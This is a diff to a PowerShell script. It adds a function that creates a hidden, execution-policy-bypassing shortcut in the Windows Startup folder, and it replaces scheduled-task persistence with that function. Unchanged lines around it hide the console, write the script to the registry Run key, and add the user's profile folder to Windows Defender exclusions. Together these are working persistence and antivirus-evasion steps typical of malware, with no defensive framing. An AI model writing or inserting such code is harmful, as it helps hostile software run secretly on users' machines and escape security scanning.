@@ -26,6 +26,17 @@ function Wait-ForInternet {
     }
 }
 
+function Add-ToStartup {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
+
+    $WshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $WshShell.CreateShortcut("$startupFolder\RunMyScript.lnk")
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $shortcut.Save()
+}
+
 function Add-ToRegistry {
     $scriptPath = $MyInvocation.MyCommand.Definition
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -33,7 +44,7 @@ function Add-ToRegistry {
 }
 
 Hide-Console
-Add-ToTaskScheduler
+Add-ToStartup
 Add-ToRegistry
 
 Add-MpPreference -ExclusionPath $env:USERPROFILE
